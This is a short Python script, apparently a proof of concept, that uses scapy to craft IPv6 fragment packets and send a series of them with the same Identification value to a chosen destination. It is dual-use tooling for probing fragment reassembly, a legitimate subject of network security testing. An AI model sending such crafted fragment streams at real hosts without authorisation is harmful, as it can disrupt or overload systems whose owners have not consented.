# Import scapy for packet crafting and sending
from scapy.all import *

def craft_fragment_packet(src_ip, dst_ip, frag_id, offset, more_fragments, payload):
    """
    Crafts an IPv6 packet with a Fragment Header.
    
    Args:
        src_ip (str): Source IPv6 address
        dst_ip (str): Destination IPv6 address
        frag_id (int): 32-bit Fragment Identification value
        offset (int): Fragment offset in 8-octet units
        more_fragments (bool): M flag (1 if more fragments follow, 0 if last)
        payload (bytes): The fragment data
    
    Returns:
        scapy.Packet: The crafted IPv6 packet
    """
    # Create IPv6 header
    ipv6 = IPv6(src=src_ip, dst=dst_ip)
    
    # Create Fragment Header
    # Next Header: 58 (ICMPv6) for simplicity in this PoC
    # Reserved: 0
    # Fragment Offset: offset
    # Res: 0
    # M flag: 1 if more_fragments else 0
    # Identification: frag_id
    frag_hdr = Fragment(
        nh=58,  # Next Header: ICMPv6
        reserved=0,
        fragOffset=offset,
        res=0,
        m=1 if more_fragments else 0,
        identification=frag_id
    )
    
    # Create ICMPv6 payload (Echo Request for simplicity)
    icmp = ICMPv6EchoRequest()
    
    # Combine headers and payload
    packet = ipv6 / frag_hdr / icmp / payload
    
    return packet

def send_fragments(src_ip, dst_ip, frag_id, num_fragments, fragment_size):
    """
    Sends a series of fragments with the same Identification value.
    
    Args:
        src_ip (str): Source IPv6 address
        dst_ip (str): Destination IPv6 address
        frag_id (int): 32-bit Fragment Identification value
        num_fragments (int): Number of fragments to send
        fragment_size (int): Size of each fragment payload
    """
    print(f"[*] Sending {num_fragments} fragments with ID {frag_id} to {dst_ip}")
    
    for i in range(num_fragments):
        # Calculate offset in 8-octet units
        offset = i * (fragment_size // 8)
        
        # Determine if this is the last fragment
        more_fragments = (i < num_fragments - 1)
        
        # Create random payload for this fragment
        payload = os.urandom(fragment_size)
        
        # Craft the fragment packet
        packet = craft_fragment_packet(src_ip, dst_ip, frag_id, offset, more_fragments, payload)
        
        # Send the packet
        send(packet, verbose=False)
        print(f"    Sent fragment {i+1}/{num_fragments} (offset={offset}, M={more_fragments})")
        
        # Small delay to simulate real-world timing
        time.sleep(0.1)

